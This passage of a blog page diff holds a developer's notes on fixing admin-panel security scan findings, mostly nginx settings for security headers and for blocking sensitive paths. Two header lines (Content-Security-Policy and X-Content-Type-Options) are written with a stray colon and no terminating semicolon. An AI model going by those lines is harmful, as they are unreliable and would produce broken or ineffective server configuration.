class="attr">class</span>=<span class="string">&quot;h30 lh30&quot;</span> <span class="attr">name</span>=<span class="string">&quot;opwd&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;原密码&quot;</span>  <span class="attr">id</span>=<span class="string">&quot;opassword&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color:#333;width:220px&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP-X-Permitted-Cross-Domain-Policies缺失"><a href="#HTTP-X-Permitted-Cross-Domain-Policies缺失" class="headerlink" title="HTTP X-Permitted-Cross-Domain-Policies缺失"></a>HTTP X-Permitted-Cross-Domain-Policies缺失</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx配置文件 添加响应头</span></span><br><span class="line"><span class="comment"># 用于指定客户端能够访问的跨域策略文件的类型。</span></span><br><span class="line"><span class="attribute">add_header</span> X-Permitted-Cross-Domain-Policies <span class="string">&quot;master-only&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数</span></span><br><span class="line"><span class="comment"># none：目标服务器的任何位置都不允许使用策略文件，包括主策略文件</span></span><br><span class="line"><span class="comment"># master-only：仅允许使用主策略文件, 默认</span></span><br><span class="line"><span class="comment"># by-content-type：仅限 HTTP/HTTPS 协议使用，只允许使用 Content-Type: text/x-cross-domain-policy 提供的策略文件</span></span><br><span class="line"><span class="comment"># by-ftp-filename：仅限 FTP 协议使用，只允许使用文件名为 crossdomain.xml 的策略文件</span></span><br><span class="line"><span class="comment"># all：目标域上的所有策略文件都可以使用</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP-Content-Security-Policy缺失"><a href="#HTTP-Content-Security-Policy缺失" class="headerlink" title="HTTP Content-Security-Policy缺失"></a>HTTP Content-Security-Policy缺失</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx配置文件 添加响应头</span></span><br><span class="line"><span class="comment"># 作用：用于定义页面可以加载哪些资源，减少和上报 XSS 的攻击，防止数据包嗅探攻击。</span></span><br><span class="line"><span class="attribute">add_header</span> Content-Security-Policy: default-src <span class="string">&#x27;self&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="X-Frame-Options-Header未配置"><a href="#X-Frame-Options-Header未配置" class="headerlink" title="X-Frame-Options Header未配置"></a>X-Frame-Options Header未配置</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx配置文件 添加响应头</span></span><br><span class="line"><span class="comment"># 是否允许一个页面可在 &lt; frame &gt;、&lt; iframe &gt;、&lt; embed &gt; 或者 &lt; object &gt; 中展现的标记。</span></span><br><span class="line"><span class="attribute">add_header</span> X-Frame-Options SAMEORIGIN;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选参数</span></span><br><span class="line"><span class="comment"># DENY：表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</span></span><br><span class="line"><span class="comment"># SAMEORIGIN：表示该页面可以在相同域名页面的 frame 中展示。</span></span><br><span class="line"><span class="comment"># ALLOW-FROM uri：表示该页面可以在指定来源的 frame 中展示。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="敏感目录"><a href="#敏感目录" class="headerlink" title="敏感目录"></a>敏感目录</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nginx 配置  </span></span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ /xxx/.*</span> &#123; </span><br><span class="line">  <span class="attribute">deny</span> all;</span><br><span class="line">  <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web应用程序错误"><a href="#Web应用程序错误" class="headerlink" title="Web应用程序错误"></a>Web应用程序错误</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试环境  debug配置打开的?</span><br></pre></td></tr></table></figure>
+
+<h2 id="表单隐藏域"><a href="#表单隐藏域" class="headerlink" title="表单隐藏域"></a>表单隐藏域</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提交参数已校验</span><br><span class="line">CreativeController -&gt; verify()</span><br></pre></td></tr></table></figure>
+
+<h2 id="Html-form表单没有CSRF防护"><a href="#Html-form表单没有CSRF防护" class="headerlink" title="Html form表单没有CSRF防护"></a>Html form表单没有CSRF防护</h2><blockquote>
+<p><code>http://192.168.1.251:9732/customer/creative/add</code></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该csrf_token未写入模板, 在js代码中, 请求时携带</span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP-X-Content-Type-Options缺失"><a href="#HTTP-X-Content-Type-Options缺失" class="headerlink" title="HTTP X-Content-Type-Options缺失"></a>HTTP X-Content-Type-Options缺失</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx配置文件 添加响应头</span></span><br><span class="line"><span class="comment"># 作用：禁用浏览器的 Content-Type 猜测行为。</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">add_header</span> X-Content-Type-Options: nosniff</span><br></pre></td></tr></table></figure>
+
+<h2 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nginx 配置  </span></span><br><span class="line"><span class="attribute">location</span> <span class="regexp">~ /xxx/\.xxxx</span> &#123; </span><br><span class="line">  <span class="attribute">deny</span> all;</span><br><span class="line">  <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="HTTP-X-Download-Options缺失"><a href="#HTTP-X-Download-Options缺失" class="headerlink" title="HTTP X-Download-Options缺失"></a>HTTP X-Download-Options缺失</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nginx配置文件 添加响应头</span></span><br><span class="line"><span class="comment"># 用于控制浏览器下载文件是否支持直接打开，如果支持直接打开，可能会有安全隐患。</span></span><br><span class="line"><span class="attribute">add_header</span> X-Download-Options noopen;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>NI9NE
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://ni9ne.github.io/2023/08/22/%E5%AE%89%E5%85%A8/%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D/" title="管理后台安全修复">https://ni9ne.github.io/2023/08/22/安全/管理后台安全修复/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/%E5%90%8E%E7%AB%AF/" rel="tag"># 后端</a>
+              <a href="/tags/%E9%A1%B9%E7%9B%AE/" rel="tag"># 项目</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/04/17/%E5%B9%BF%E5%91%8A%E8%90%A5%E9%94%80/ADX%E9%A1%B9%E7%9B%AE%E5%B9%B3%E5%8F%B0%E8%B0%83%E6%9F%A5/" rel="prev" title="ADX项目平台调查">
+                  <i class="fa fa-chevron-left"></i> ADX项目平台调查
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">NI9NE</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://unpkg.com/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@next-theme/pjax@0.5.0/pjax.min.js" integrity="sha256-3NkoLDrmHLTYj7csHIZSr0MHAFTXth7Ua/DDt4MRUAg=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/medium-zoom@1.0.6/dist/medium-zoom.min.js" integrity="sha256-EdPgYcPk/IIrw7FYeuJQexva49pVRZNmt3LculEr7zM=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  
+<script src="https://unpkg.com/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
